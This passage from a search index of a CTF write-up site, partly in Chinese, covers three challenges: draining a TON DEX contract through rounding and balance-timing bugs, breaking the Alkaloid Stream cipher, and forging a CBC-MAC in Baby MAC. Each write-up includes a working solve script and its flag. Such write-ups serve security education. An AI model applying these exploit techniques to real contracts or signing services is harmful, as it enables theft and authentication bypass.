log ( \"User created\" ); let l = [[ 9 , 1 ], [ 1 , 1 ], [ 1 , 0 ], [ 3 , 1 ], [ 1 , 1 ], [ 1 , 0 ], [ 4 , 1 ], [ 1 , 1 ], [ 1 , 0 ], [ 7 , 1 ], [ 1 , 0 ], [ 9 , 1 ], [ 1 , 1 ], [ 1 , 0 ]]; for ( let i = 0 ; i < l . length ; i ++ ) { await contract_open . send ( deployer_wallet_contract . sender ( secretKey ), { value : toNano ( \"0.14\" ), }, { \"$$type\" : \"Swap\" , \"amount\" : BigInt ( l [ i ][ 0 ]), \"a_b\" : BigInt ( l [ i ][ 1 ]), } ); seqno = await sleep ( deployer_wallet_contract , seqno ); console . log ( \"Sent\" , i ); } console . log ( \"Swap done\" ); await contract_open . send ( deployer_wallet_contract . sender ( secretKey ), { value : toNano ( \"2\" ), }, { \"$$type\" : \"Withdraw\" , \"value\" : toNano ( \"1.9\" ), } ); seqno = await sleep ( deployer_wallet_contract , seqno ); await contract_open . send ( deployer_wallet_contract . sender ( secretKey ), { value : toNano ( \"0.01\" ), }, \"Solve\" ); await sleep ( deployer_wallet_contract , seqno ); console . log ( await contract_open . getIsSolved ()); })(); Flag \u00b6 flag{yGNp5ttpbLnU}_Dex References \u00b6 Variable coins type Transactions and phases myBalance Message mode","title":"Dex"},{"location":"blockchain/ton/dex/#description","text":"Challenge Files dex.tact 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 import \"@stdlib/deploy\" ; message Withdraw { value : Int as coins ; } message Swap { amount : Int as coins ; a_b : Int ; } contract Dex with Deployable { override const storageReserve : Int = ton ( \"0.1\" ); solved : Bool ; lock : Bool ; tokena_amount : Int as coins ; tokenb_amount : Int as coins ; user_balances : map < Int , Int > ; user_created : Bool ; init ( ctf : Int ) { self . solved = false ; self . lock = true ; self . user_created = false ; self . tokena_amount = 10 ; self . tokenb_amount = 10 ; } receive ( \"CreateUser\" ){ require ( ! self . user_created , \"User created\" ); self . user_balances . set ( 1 , 10 ); self . user_balances . set ( 2 , 0 ); self . user_created = true ; } receive ( msg : Swap ){ let ctx : Context = context (); require ( ctx . value >= ton ( \"0.14\" ), \"insufficient pay for gas\" ); require ( self . user_created , \"Not created\" ); let x : Int = self . tokena_amount ; let y : Int = self . tokenb_amount ; let user_a : Int = self . user_balances . get ( 1 ) !! ; let user_b : Int = self . user_balances . get ( 2 ) !! ; if ( msg . a_b == 1 ){ require ( user_a >= msg . amount , \"Insufficient balance\" ); let out_amount : Int = y - ( x * y ) / ( x + msg . amount ); self . user_balances . set ( 1 , user_a - msg . amount ); self . user_balances . set ( 2 , user_b + out_amount ); self . tokena_amount = x + msg . amount ; self . tokenb_amount = y - out_amount ; } else { require ( user_b >= msg . amount , \"Insufficient balance\" ); let out_amount : Int = x - ( x * y ) / ( y + msg . amount ); self . user_balances . set ( 1 , user_a + out_amount ); self . user_balances . set ( 2 , user_b - msg . amount ); self . tokena_amount = x - out_amount ; self . tokenb_amount = y + msg . amount ; } if ( self . user_balances . get ( 1 ) !! + self . user_balances . get ( 2 ) !! == 29 ){ self . lock = false ; } } receive ( msg : Withdraw ) { require ( ! self . lock , \"locking\" ); // Get the current context let ctx : Context = context (); // Require required balance require ( myBalance () > ton ( \"1.0\" ) + self . storageReserve + msg . value , \"Insufficient balance\" ); // Withdraw send ( SendParameters { value : msg . value , mode : SendRemainingValue , to : ctx . sender , body : \"Withdraw \u0441ompleted\" . asComment () }); } receive ( \"Solve\" ){ require ( ! self . lock , \"Locking\" ); if ( myBalance () < ton ( \"0.5\" )){ self . solved = true ; } } get fun is_solved (): Bool { return self . solved == true ; } }","title":"Description"},{"location":"blockchain/ton/dex/#solution","text":"We first need to let the sum of the user_balances be 29 to set locked to false . After unlocking, send a Solve message when the contract balance is less than 0.5 ton to solve the challenge There is a loss of precision when calculating the out_amount . So, we may get more tokens after swapping Note that amount is serialized as coins , which is an alias to VarUInteger_16 . We can not send a negative value 1 2 3 4 message Swap { amount : Int as coins ; a_b : Int ; } After swapping, the contract balance will be surely above 0.5 ton. Because each swap requires sending at least 0.14 ton, and locked can't be set to false with just one or two swaps We have to bypass the check and withdraw some ton from the contract. myBalance() returns the nanoToncoin balance of the smart contract as it was at the start of the compute phase of the current transaction. Thus, we can increase the value attached to the withdraw message. Any excess left from the incoming message after all gas costs are deducted from it will be add to the outgoing value because of the send mode SendRemainingValue Each transaction consists of up to 5 phases: storage phase, credit phase, compute phase, action phase and bounce phase. In the credit phase, the balance of the contract with respect to a (possible) incoming message value and collected storage fee are calculated 1 2 3 4 5 6 7 8 9 10 11 12 13 14 receive ( msg : Withdraw ) { require ( ! self . lock , \"locking\" ); // Get the current context let ctx : Context = context (); // Require required balance require ( myBalance () > ton ( \"1.0\" ) + self . storageReserve + msg . value , \"Insufficient balance\" ); // Withdraw send ( SendParameters { value : msg . value , mode : SendRemainingValue , to : ctx . sender , body : \"Withdraw \u0441ompleted\" . asComment () }); }","title":"Solution"},{"location":"blockchain/ton/dex/#exploitation","text":"Before and after the swap, the sum of tokena_amount , tokenb_amount , user_balances(1) and user_balances(2) remains unchanged. So after each swap, we hope that the sum of user_balances will increase, or at least the product of tokena_amount and tokenb_amount will decrease, which may result in a larger out_amount . swap.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 def fun ( x , y , user_a , user_b , a , f ): if f == 1 : out = y - ( x * y ) // ( x + a ) return user_a - a , user_b + out , x + a , y - out else : out = x - ( x * y ) // ( y + a ) return user_a + out , user_b - a , x - out , y + a user_a , user_b = 10 , 0 x , y = 10 , 10 cnt = 0 while user_a + user_b < 29 : if user_b == 0 or user_a > 0 : for i in range ( user_a , 0 , - 1 ): ra , rb , rx , ry = fun ( x , y , user_a , user_b , i , 1 ) if ra + rb > user_a + user_b or rx * ry < x * y : user_a , user_b , x , y = ra , rb , rx , ry print ( f \"amount: { i } a_b: { 1 } user_a: { user_a } user_b: { user_b } x: { x } y: { y } \" ) cnt += 1 break if user_a == 0 : for i in range ( 1 , user_b + 1 ): ra , rb , rx , ry = fun ( x , y , user_a , user_b , i , 0 ) if ra + rb > user_a + user_b or rx * ry < x * y : user_a , user_b , x , y = ra , rb , rx , ry print ( f \"amount: { i } a_b: { 0 } user_a: { user_a } user_b: { user_b } x: { x } y: { y } \" ) cnt += 1 break print ( cnt ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 import { OpenedContract , Address , toNano , TonClient , WalletContractV4 } from \"@ton/ton\" ; import { mnemonicToPrivateKey } from \"ton-crypto\" ; import { Dex } from \"./output/Dex_Dex\" ; import * as dotenv from \"dotenv\" ; dotenv . config (); async function sleep ( wallet_contract : OpenedContract < WalletContractV4 > , seq : number ) { while ( true ) { if ( seq < ( await wallet_contract . getSeqno ())) { return wallet_contract . getSeqno (); } } } ( async () => { const client = new TonClient ({ endpoint : \"http://65.21.223.95:8081/jsonRPC\" , }); let mnemonics = ( process . env . mnemonics_2 || \"\" ). toString (); console . log ( mnemonics ); let keyPair = await mnemonicToPrivateKey ( mnemonics . split ( \" \" )); let secretKey = keyPair . secretKey ; let workchain = 0 ; let deployer_wallet = WalletContractV4 . create ({ workchain , publicKey : keyPair.publicKey }); console . log ( deployer_wallet . address ); let deployer_wallet_contract = client . open ( deployer_wallet ); console . log ( \"Balance\" , await deployer_wallet_contract . getBalance ()); let target = Address . parse ( CONTRACT ); let contract_open = await client . open ( Dex . fromAddress ( target )); let seqno : number = await deployer_wallet_contract . getSeqno (); await contract_open . send ( deployer_wallet_contract . sender ( secretKey ), { value : toNano ( \"0.1\" ), }, \"CreateUser\" ); seqno = await sleep ( deployer_wallet_contract , seqno ); console . log ( \"User created\" ); let l = [[ 9 , 1 ], [ 1 , 1 ], [ 1 , 0 ], [ 3 , 1 ], [ 1 , 1 ], [ 1 , 0 ], [ 4 , 1 ], [ 1 , 1 ], [ 1 , 0 ], [ 7 , 1 ], [ 1 , 0 ], [ 9 , 1 ], [ 1 , 1 ], [ 1 , 0 ]]; for ( let i = 0 ; i < l . length ; i ++ ) { await contract_open . send ( deployer_wallet_contract . sender ( secretKey ), { value : toNano ( \"0.14\" ), }, { \"$$type\" : \"Swap\" , \"amount\" : BigInt ( l [ i ][ 0 ]), \"a_b\" : BigInt ( l [ i ][ 1 ]), } ); seqno = await sleep ( deployer_wallet_contract , seqno ); console . log ( \"Sent\" , i ); } console . log ( \"Swap done\" ); await contract_open . send ( deployer_wallet_contract . sender ( secretKey ), { value : toNano ( \"2\" ), }, { \"$$type\" : \"Withdraw\" , \"value\" : toNano ( \"1.9\" ), } ); seqno = await sleep ( deployer_wallet_contract , seqno ); await contract_open . send ( deployer_wallet_contract . sender ( secretKey ), { value : toNano ( \"0.01\" ), }, \"Solve\" ); await sleep ( deployer_wallet_contract , seqno ); console . log ( await contract_open . getIsSolved ()); })();","title":"Exploitation"},{"location":"blockchain/ton/dex/#flag","text":"flag{yGNp5ttpbLnU}_Dex","title":"Flag"},{"location":"blockchain/ton/dex/#references","text":"Variable coins type Transactions and phases myBalance Message mode","title":"References"},{"location":"crypto/alkaloid_stream/","text":"\u9898\u76ee \u00b6 I found a weird stream cipher scheme. Can you break this? CTFtime.org / pbctf 2021 / Alkaloid Stream \u89e3\u9898\u601d\u8def \u00b6 \u52a0\u5bc6\u7a0b\u5e8f gen.py \u548c\u8f93\u51fa\u6587\u4ef6 output.txt \u5148\u770b\u770b\u52a0\u5bc6\u7a0b\u5e8f\u6267\u884c\u7684\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 flag = bytes_to_bits ( flag ) key = keygen ( len ( flag )) # \u6839\u636e flag \u7684\u957f\u5ea6\u4ea7\u751f\u5bc6\u94a5 keystream , public = gen_keystream ( key ) assert keystream == recover_keystream ( key , public ) # \u5224\u65ad\u662f\u5426\u80fd\u7531 key \u548c public \u8fd8\u539f\u51fa keystream enc = bits_to_bytes ( xor ( flag , keystream )) # flag\u3001enc \u548c keystream \u4e09\u8005\u957f\u5ea6\u4e00\u81f4 # \u5f02\u6216\uff0c\u5df2\u77e5 enc \u548c keystream \u53ef\u6c42 flag print ( enc . hex ()) print ( public ) \u73b0\u5728\u5df2\u77e5 enc \u548c public \uff0c\u9700\u8981\u83b7\u5f97 key \u6216\u8005 keystream \u624d\u80fd\u5f97\u5230 flag keygen \u51fd\u6570\u53ea\u8981\u63d0\u4f9b\u957f\u5ea6\u5c31\u53ef\u4ee5\u8f93\u51fa\u5bc6\u94a5\uff01\u4e8e\u662f\u6109\u5feb\u5730\u770b\u4e86\u770b\uff0c\u7ed3\u679c\u53d1\u73b0\u7528\u5230\u4e86\u968f\u673a\u6570 (\u2565\u03c9\u2565) \u3010\u7206\u7834\u5f53\u7136\u662f\u4e0d\u73b0\u5b9e\u7684\uff01\u3011 1 2 3 4 5 6 7 8 9 10 11 12 13 14 def keygen ( ln ): # Generate a linearly independent key arr = [ 1 << i for i in range ( ln ) ] for i in range ( ln ): for j in range ( i ): if random . getrandbits ( 1 ): arr [ j ] ^= arr [ i ] for i in range ( ln ): for j in range ( i ): if random . getrandbits ( 1 ): arr [ ln - 1 - j ] ^= arr [ ln - 1 - i ] return arr \u56e0\u4e3a\u6ca1\u6709 key \uff0c recover_keystream \u51fd\u6570\u4e5f\u6ca1\u6709\u4ec0\u4e48\u7528\u4e86\uff0c gen_keystream \u51fd\u6570\u6210\u4e3a\u4e86\u91cd\u70b9\u5173\u6ce8\u5bf9\u8c61 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 def gen_keystream ( key ): ln = len ( key ) # Generate some fake values based on the given key... fake = [ 0 ] * ln for i in range ( ln ): for j in range ( ln // 3 ): if i + j + 1 >= ln : break fake [ i ] ^= key [ i + j + 1 ] # Generate the keystream res = [] for i in range ( ln ): t = random . getrandbits ( 1 ) if t : res . append (( t , [ fake [ i ], key [ i ]])) else : res . append (( t , [ key [ i ], fake [ i ]])) # Shuffle! random . shuffle ( res ) keystream = [ v [ 0 ] for v in res ] public = [ v [ 1 ] for v in res ] # \u7531 key \u548c fake \u6570\u7ec4\u7ec4\u6210 return keystream , public \u5176\u4e2d\uff0c fake \u6570\u7ec4\u7684\u4ea7\u751f\u8fc7\u7a0b\u4e3a\u7a81\u7834\u70b9\u3002\u5f53\u4e14\u4ec5\u5f53 \\(i = ln - 1\\) \u65f6\uff0c \\(fake[ln - 1]\\) \u4e0d\u4e0e key \u6570\u7ec4\u4e2d\u7684\u503c\u5f02\u6216\uff0c\u4e14 fake \u6570\u7ec4\u521d\u59cb\u503c\u4e3a\u5168 \\(0\\) \uff0c\u56e0\u6b64 \\(fake[ln - 1] = 0\\) \u3002\u5728 output.txt \u4e2d\u641c\u7d22\uff0c\u53ea\u6709\u4e00\u4e2a \\(0\\) \\(\u03a6\u03c9\u03a6)/ \u7531\u6b64\u7ed3\u5408 public \u6570\u7ec4\u53ef\u4ee5\u4f9d\u6b21\u63a8\u51fa key \u6570\u7ec4\u548c keystream \\(fake[ln - 1] => key[ln - 1]\\) \\(key[ln - 1] = fake[ln - 2] => key[ln - 2]\\) \\(key[ln - 2] \\oplus key[ln - 1] = fake[ln - 3] => key[ln - 3]\\) \\(... ...\\) \u4f7f\u7528 recover_keystream \u51fd\u6570\u6216\u76f4\u63a5\u7528 keystream \u5f02\u6216 enc \u5c31\u53ef\u4ee5\u5f97\u5230 Flag \u5566\uff01(\u03a6\u02cb\u03c9\u02ca\u03a6) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ln = len ( enc ) key = [ 0 ] * ln keystream = [ 0 ] * ln # \u4f9d\u6b21\u6c42\u89e3 for i in range ( ln - 1 , - 1 , - 1 ): fake = 0 for j in range ( ln // 3 ): if i + j + 1 >= ln : break fake ^= key [ i + j + 1 ] for p in range ( ln ): if fake == public [ p ][ 0 ]: key [ i ] = public [ p ][ 1 ] keystream [ p ] = 1 public [ p ] = [ - 1 , - 1 ] elif fake == public [ p ][ 1 ]: key [ i ] = public [ p ][ 0 ] keystream [ p ] = 0 public [ p ] = [ - 1 , - 1 ] print ( bits_to_bytes ( xor ( enc , keystream ))) # b'pbctf{super_duper_easy_brute_forcing_actually_this_one_was_made_by_mistake}'","title":"Alkaloid Stream"},{"location":"crypto/alkaloid_stream/#_1","text":"I found a weird stream cipher scheme. Can you break this? CTFtime.org / pbctf 2021 / Alkaloid Stream","title":"\u9898\u76ee"},{"location":"crypto/alkaloid_stream/#_2","text":"\u52a0\u5bc6\u7a0b\u5e8f gen.py \u548c\u8f93\u51fa\u6587\u4ef6 output.txt \u5148\u770b\u770b\u52a0\u5bc6\u7a0b\u5e8f\u6267\u884c\u7684\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 flag = bytes_to_bits ( flag ) key = keygen ( len ( flag )) # \u6839\u636e flag \u7684\u957f\u5ea6\u4ea7\u751f\u5bc6\u94a5 keystream , public = gen_keystream ( key ) assert keystream == recover_keystream ( key , public ) # \u5224\u65ad\u662f\u5426\u80fd\u7531 key \u548c public \u8fd8\u539f\u51fa keystream enc = bits_to_bytes ( xor ( flag , keystream )) # flag\u3001enc \u548c keystream \u4e09\u8005\u957f\u5ea6\u4e00\u81f4 # \u5f02\u6216\uff0c\u5df2\u77e5 enc \u548c keystream \u53ef\u6c42 flag print ( enc . hex ()) print ( public ) \u73b0\u5728\u5df2\u77e5 enc \u548c public \uff0c\u9700\u8981\u83b7\u5f97 key \u6216\u8005 keystream \u624d\u80fd\u5f97\u5230 flag keygen \u51fd\u6570\u53ea\u8981\u63d0\u4f9b\u957f\u5ea6\u5c31\u53ef\u4ee5\u8f93\u51fa\u5bc6\u94a5\uff01\u4e8e\u662f\u6109\u5feb\u5730\u770b\u4e86\u770b\uff0c\u7ed3\u679c\u53d1\u73b0\u7528\u5230\u4e86\u968f\u673a\u6570 (\u2565\u03c9\u2565) \u3010\u7206\u7834\u5f53\u7136\u662f\u4e0d\u73b0\u5b9e\u7684\uff01\u3011 1 2 3 4 5 6 7 8 9 10 11 12 13 14 def keygen ( ln ): # Generate a linearly independent key arr = [ 1 << i for i in range ( ln ) ] for i in range ( ln ): for j in range ( i ): if random . getrandbits ( 1 ): arr [ j ] ^= arr [ i ] for i in range ( ln ): for j in range ( i ): if random . getrandbits ( 1 ): arr [ ln - 1 - j ] ^= arr [ ln - 1 - i ] return arr \u56e0\u4e3a\u6ca1\u6709 key \uff0c recover_keystream \u51fd\u6570\u4e5f\u6ca1\u6709\u4ec0\u4e48\u7528\u4e86\uff0c gen_keystream \u51fd\u6570\u6210\u4e3a\u4e86\u91cd\u70b9\u5173\u6ce8\u5bf9\u8c61 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 def gen_keystream ( key ): ln = len ( key ) # Generate some fake values based on the given key... fake = [ 0 ] * ln for i in range ( ln ): for j in range ( ln // 3 ): if i + j + 1 >= ln : break fake [ i ] ^= key [ i + j + 1 ] # Generate the keystream res = [] for i in range ( ln ): t = random . getrandbits ( 1 ) if t : res . append (( t , [ fake [ i ], key [ i ]])) else : res . append (( t , [ key [ i ], fake [ i ]])) # Shuffle! random . shuffle ( res ) keystream = [ v [ 0 ] for v in res ] public = [ v [ 1 ] for v in res ] # \u7531 key \u548c fake \u6570\u7ec4\u7ec4\u6210 return keystream , public \u5176\u4e2d\uff0c fake \u6570\u7ec4\u7684\u4ea7\u751f\u8fc7\u7a0b\u4e3a\u7a81\u7834\u70b9\u3002\u5f53\u4e14\u4ec5\u5f53 \\(i = ln - 1\\) \u65f6\uff0c \\(fake[ln - 1]\\) \u4e0d\u4e0e key \u6570\u7ec4\u4e2d\u7684\u503c\u5f02\u6216\uff0c\u4e14 fake \u6570\u7ec4\u521d\u59cb\u503c\u4e3a\u5168 \\(0\\) \uff0c\u56e0\u6b64 \\(fake[ln - 1] = 0\\) \u3002\u5728 output.txt \u4e2d\u641c\u7d22\uff0c\u53ea\u6709\u4e00\u4e2a \\(0\\) \\(\u03a6\u03c9\u03a6)/ \u7531\u6b64\u7ed3\u5408 public \u6570\u7ec4\u53ef\u4ee5\u4f9d\u6b21\u63a8\u51fa key \u6570\u7ec4\u548c keystream \\(fake[ln - 1] => key[ln - 1]\\) \\(key[ln - 1] = fake[ln - 2] => key[ln - 2]\\) \\(key[ln - 2] \\oplus key[ln - 1] = fake[ln - 3] => key[ln - 3]\\) \\(... ...\\) \u4f7f\u7528 recover_keystream \u51fd\u6570\u6216\u76f4\u63a5\u7528 keystream \u5f02\u6216 enc \u5c31\u53ef\u4ee5\u5f97\u5230 Flag \u5566\uff01(\u03a6\u02cb\u03c9\u02ca\u03a6) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ln = len ( enc ) key = [ 0 ] * ln keystream = [ 0 ] * ln # \u4f9d\u6b21\u6c42\u89e3 for i in range ( ln - 1 , - 1 , - 1 ): fake = 0 for j in range ( ln // 3 ): if i + j + 1 >= ln : break fake ^= key [ i + j + 1 ] for p in range ( ln ): if fake == public [ p ][ 0 ]: key [ i ] = public [ p ][ 1 ] keystream [ p ] = 1 public [ p ] = [ - 1 , - 1 ] elif fake == public [ p ][ 1 ]: key [ i ] = public [ p ][ 0 ] keystream [ p ] = 0 public [ p ] = [ - 1 , - 1 ] print ( bits_to_bytes ( xor ( enc , keystream ))) # b'pbctf{super_duper_easy_brute_forcing_actually_this_one_was_made_by_mistake}'","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/baby_mac/","text":"\u9898\u76ee \u00b6 We implemented a simple signing service. Can you sign a flag request? nc babymac.hackable.software 1337 task.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 #!/usr/bin/env python3 import os try : from Crypto.Cipher import AES except ImportError : from Cryptodome.Cipher import AES def split_by ( data , cnt ): return [ data [ i : i + cnt ] for i in range ( 0 , len ( data ), cnt )] def pad ( data , bsize ): b = bsize - len ( data ) % bsize return data + bytes ([ b ] * b ) def xor ( a , b ): return bytes ( aa ^ bb for aa , bb in zip ( a , b )) def sign ( data , key ): data = pad ( data , 16 ) blocks = split_by ( data , 16 ) mac = b ' \\0 ' * 16 aes = AES . new ( key , AES . MODE_ECB ) for block in blocks : mac = xor ( mac , block ) mac = aes . encrypt ( mac ) mac = aes . encrypt ( mac ) return mac def verify ( data , key ): if len ( data ) < 16 : return False , '' tag , data = data [: 16 ], data [ 16 :] correct_tag = sign ( data , key ) if tag != correct_tag : return False , '' return True , data def main (): key = os . urandom ( 16 ) while True : print ( 'What to do?' ) opt = input ( '> ' ) . strip () if opt == 'sign' : data = input ( '> ' ) . strip () data = bytes . fromhex ( data ) if b 'gimme flag' in data : print ( 'That \\' s not gonna happen' ) break print (( sign ( data , key ) + data ) . hex ()) elif opt == 'verify' : data = input ( '> ' ) . strip () data = bytes . fromhex ( data ) ok , data = verify ( data , key ) if ok : if b 'gimme flag' in data : with open ( 'flag.txt' , 'r' ) as f : print ( f . read ()) else : print ( 'looks ok!' ) else : print ( 'hacker detected!' ) else : print ( '??' ) break return 0 if __name__ == '__main__' : exit ( main ()) \u89e3\u9898\u601d\u8def \u00b6 \u9700\u8981\u5728\u4e0d\u8f93\u5165\u5305\u542b gimme flag \u5b57\u7b26\u4e32\u7684\u60c5\u51b5\u4e0b\uff0c\u83b7\u5f97\u5305\u542b gimme flag \u5b57\u7b26\u4e32\u7684 MAC \u5206\u6790 sign() \u51fd\u6570\uff0c\u53d1\u73b0\u5b9e\u9645\u662f CBC-MAC 1 2 3 4 5 6 7 8 9 10 11 def sign ( data , key ): data = pad ( data , 16 ) blocks = split_by ( data , 16 ) mac = b ' \\0 ' * 16 aes = AES . new ( key , AES . MODE_ECB ) for block in blocks : mac = xor ( mac , block ) mac = aes . encrypt ( mac ) # \u7ed3\u679c\u518d\u52a0\u5bc6\uff0c\u53ef\u4ee5\u8ba4\u4e3a\u5b9e\u9645\u52a0\u5bc6\u7684\u6d88\u606f\u4e3a blocks + (b'\\0' * 16) mac = aes . encrypt ( mac ) return mac \u5f53\u660e\u6587\u957f\u5ea6\u521a\u597d\u4e3a 16 \u5b57\u8282\u65f6\uff0c\u5c06\u586b\u5145 b'\\x10' * 16 \uff0c\u7528 \\(pad\\) \u8868\u793a\uff0c \\(iv\\) \u8868\u793a b'\\x00' * 16 \u53ef\u4ee5\u5229\u7528\u5f02\u6216\u53d6\u5f97\u76ee\u6807\u5b57\u7b26\u4e32\u7684 MAC\uff08\u52a0\u5bc6\u8fc7\u7a0b\u7b80\u5355\u8868\u793a\u4e3a\u987a\u5e8f\u5757\u7684\u5f62\u5f0f\uff0c\u5982 \\(pad, iv\\) \u7b49\u4ef7\u4e8e \\(MAC_k(MAC_k(pad) \\oplus iv)\\) \uff09 \\(pad, iv = C_0\\) \\(P=hex(gimme\\,flag123456)\\) \\(x=C_0 \\oplus P\\) \\(pad, iv, x, pad, iv = C_1 => P, pad, iv = C_1\\) \u5b9e\u9645\u53ea\u8981\u77e5\u9053 \\(pad+iv\\) \u548c \\(pad+iv+x+pad+iv\\) \u7684 MAC \u5c31\u53ef\u4ee5\u4e86 XD 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/usr/bin/python import pwn from Crypto.Util.number import bytes_to_long , long_to_bytes conn = pwn . remote ( \"babymac.hackable.software\" , 1337 ) conn . sendafter ( '> ' , 'sign \\n ' ) conn . sendafter ( '> ' , ' \\n ' ) c0 = bytes . fromhex ( conn . recvline () . decode () . strip ()) P = b 'gimme flag123456' x = long_to_bytes ( bytes_to_long ( P ) ^ bytes_to_long ( c0 )) . hex () conn . sendafter ( '> ' , 'sign \\n ' ) conn . sendafter ( '> ' , '10' * 16 + '00' * 16 + x + ' \\n ' ) c1 = conn . recvline () . decode ()[: 32 ] conn . sendafter ( '> ' , 'verify \\n ' ) conn . sendafter ( '> ' , c1 + P . hex () + ' \\n ' ) conn . interactive ()","title":"Baby MAC"},{"location":"crypto/baby_mac/#_1","text":"We implemented a simple signing service. Can you sign a flag request? nc babymac.hackable.software 1337 task.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 #!/usr/bin/env python3 import os try : from Crypto.Cipher import AES except ImportError : from Cryptodome.Cipher import AES def split_by ( data , cnt ): return [ data [ i : i + cnt ] for i in range ( 0 , len ( data ), cnt )] def pad ( data , bsize ): b = bsize - len ( data ) % bsize return data + bytes ([ b ] * b ) def xor ( a , b ): return bytes ( aa ^ bb for aa , bb in zip ( a , b )) def sign ( data , key ): data = pad ( data , 16 ) blocks = split_by ( data , 16 ) mac = b ' \\0 ' * 16 aes = AES . new ( key , AES . MODE_ECB ) for block in blocks : mac = xor ( mac , block ) mac = aes . encrypt ( mac ) mac = aes . encrypt ( mac ) return mac def verify ( data , key ): if len ( data ) < 16 : return False , '' tag , data = data [: 16 ], data [ 16 :] correct_tag = sign ( data , key ) if tag != correct_tag : return False , '' return True , data def main (): key = os . urandom ( 16 ) while True : print ( 'What to do?' ) opt = input ( '> ' ) . strip () if opt == 'sign' : data = input ( '> ' ) . strip () data = bytes . fromhex ( data ) if b 'gimme flag' in data : print ( 'That \\' s not gonna happen' ) break print (( sign ( data , key ) + data ) . hex ()) elif opt == 'verify' : data = input ( '> ' ) . strip () data = bytes . fromhex ( data ) ok , data = verify ( data , key ) if ok : if b 'gimme flag' in data : with open ( 'flag.txt' , 'r' ) as f : print ( f . read ()) else : print ( 'looks ok!' ) else : print ( 'hacker detected!' ) else : print ( '??' ) break return 0 if __name__ == '__main__' : exit ( main ())","title":"\u9898\u76ee"},{"location":"crypto/baby_mac/#_2","text":"\u9700\u8981\u5728\u4e0d\u8f93\u5165\u5305\u542b gimme flag \u5b57\u7b26\u4e32\u7684\u60c5\u51b5\u4e0b\uff0c\u83b7\u5f97\u5305\u542b gimme flag \u5b57\u7b26\u4e32\u7684 MAC \u5206\u6790 sign() \u51fd\u6570\uff0c\u53d1\u73b0\u5b9e\u9645\u662f CBC-MAC 1 2 3 4 5 6 7 8 9 10 11 def sign ( data , key ): data = pad ( data , 16 ) blocks = split_by ( data , 16 ) mac = b ' \\0 ' * 16 aes = AES . new ( key , AES . MODE_ECB ) for block in blocks : mac = xor ( mac , block ) mac = aes . encrypt ( mac ) # \u7ed3\u679c\u518d\u52a0\u5bc6\uff0c\u53ef\u4ee5\u8ba4\u4e3a\u5b9e\u9645\u52a0\u5bc6\u7684\u6d88\u606f\u4e3a blocks + (b'\\0' * 16) mac = aes . encrypt ( mac ) return mac \u5f53\u660e\u6587\u957f\u5ea6\u521a\u597d\u4e3a 16 \u5b57\u8282\u65f6\uff0c\u5c06\u586b\u5145 b'\\x10' * 16 \uff0c\u7528 \\(pad\\) \u8868\u793a\uff0c \\(iv\\) \u8868\u793a b'\\x00' * 16 \u53ef\u4ee5\u5229\u7528\u5f02\u6216\u53d6\u5f97\u76ee\u6807\u5b57\u7b26\u4e32\u7684 MAC\uff08\u52a0\u5bc6\u8fc7\u7a0b\u7b80\u5355\u8868\u793a\u4e3a\u987a\u5e8f\u5757\u7684\u5f62\u5f0f\uff0c\u5982 \\(pad, iv\\) \u7b49\u4ef7\u4e8e \\(MAC_k(MAC_k(pad) \\oplus iv)\\) \uff09 \\(pad, iv = C_0\\) \\(P=hex(gimme\\,flag123456)\\) \\(x=C_0 \\oplus P\\) \\(pad, iv, x, pad, iv = C_1 => P, pad, iv = C_1\\) \u5b9e\u9645\u53ea\u8981\u77e5\u9053 \\(pad+iv\\) \u548c \\(pad+iv+x+pad+iv\\) \u7684 MAC \u5c31\u53ef\u4ee5\u4e86 XD 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/usr/bin/python import pwn from Crypto.Util.number import bytes_to_long , long_to_bytes conn = pwn . remote ( \"babymac.hackable.software\" , 1337 ) conn . sendafter ( '> ' , 'sign \\n ' ) conn . sendafter ( '> ' , ' \\n ' ) c0 = bytes . fromhex ( conn . recvline () . decode () . strip ()) P = b 'gimme flag123456' x = long_to_bytes ( bytes_to_long ( P ) ^ bytes_to_long ( c0 )) . hex () conn . sendafter ( '> ' , 'sign \\n ' ) conn . sendafter ( '> ' , '10' * 16 + '00' * 16 + x + ' \\n ' ) c1 = conn . recvline () . decode ()[: 32 ] conn . sendafter ( '> ' , 'verify \\n ' ) conn . sendafter ( '> ' , c1 + P . hex () + ' \\n ' ) conn . interactive ()","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/badkey1/","tags":["rsa","pycryptodome","invalid key"],"text":"#rsa #pycryptodome #invalid key .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset 